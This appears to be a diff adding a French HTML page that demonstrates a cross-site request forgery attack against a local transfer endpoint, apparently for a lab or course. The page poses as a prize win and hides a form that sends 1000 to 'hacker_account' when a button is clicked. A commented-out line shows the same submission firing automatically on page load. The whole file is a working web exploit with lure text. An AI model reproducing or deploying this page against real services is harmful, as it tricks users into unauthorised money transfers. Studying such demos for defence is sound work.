@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Cadeau Surprise !</title>
+        <meta charset="UTF-8">
+    </head>
+
+    <!-- On pourrait exécuter la soumission directe au chargement de la page -->
+    <!--    <body onload="document.csrf_form.submit()">-->
+    <body>
+        <h1>🎉 Félicitations ! Vous avez gagné un prix ! 🎉</h1>
+
+        <!-- Formulaire de soumission de la requête de transfert -->
+        <!-- On a recopié le formulaire officiel, mais volontairement on ne l'affiche pas -->
+        <form name="csrf_form"
+              action="http://localhost:8080/transfert.php"
+              method="GET"
+              style="display:none;">
+            <input type="hidden" name="amount" value="1000">
+            <input type="hidden" name="recipient" value="hacker_account">
+        </form>
+
+        <p>Veuillez patienter pendant que nous validons votre gain...</p>
+
+        <button onclick="document.csrf_form.submit()">Ce bouton n'est là que pour la démonstration, et lancer la faille CSRF, ça aurait pu se faire au chargement de la page</button>
+    </body>
+</html>
